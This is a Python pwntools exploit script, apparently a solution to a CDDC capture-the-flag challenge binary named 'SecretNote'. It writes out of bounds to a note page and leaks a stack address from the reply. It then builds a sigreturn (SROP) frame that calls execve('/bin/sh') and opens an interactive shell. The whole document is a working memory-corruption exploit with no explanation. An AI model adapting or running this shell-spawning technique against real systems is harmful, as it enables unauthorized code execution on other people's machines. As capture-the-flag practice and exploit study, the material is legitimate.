from pwn import *

context.arch = "amd64"
context.log_level = 'debug'
p = process("./SecretNote")

gdbscript = '''
continue
'''.format(**locals())

#gdb.attach(p, gdbscript=gdbscript)

elf = ELF("SecretNote")

def read(i):
	p.recvuntil("Input your name : ")
	p.sendline("CDDC")
	p.recvuntil("[2] Edit\n[>] ")
	p.sendline("1")
	p.recvuntil("Read page : ")
	p.sendline(str(i).encode())
	p.recvline()
	p.recvline()

	return p.recvline().strip()


def edit(i, message):
	p.recvuntil("Input your name : ")
	p.sendline("CDDC")
	p.recvuntil("[2] Edit\n[>] ")
	p.sendline("2")
	p.recvuntil("Edit page : ")
	p.sendline(str(i).encode())
	p.recvuntil("New note : ")
	p.send(message)

edit(32, b'A'*40)

leak = read(32)
stack_addr = u64(leak[-6:].ljust(8, b"\x00"))
sigret_frame = SigreturnFrame()

sigret_frame.rip = 0x401284
sigret_frame.rax = constants.SYS_execve
sigret_frame.rdi = stack_addr - 0x10
sigret_frame.rsi = 0
sigret_frame.rdx = 0

payload = p64(15) + p64(0x40127F) + bytes(sigret_frame) + b"/bin/sh\x00"

edit(32, payload)
#edit(32, flat([15, 0x40127F, sigret_frame, b"/bin/sh\x00"]))
for i in range(29):
    p.recvuntil(b"Input your name : ")
    p.sendline(b"wayell")
    p.recvuntil(b"Input your note : ")
    p.send(b"wayell")

p.interactive()
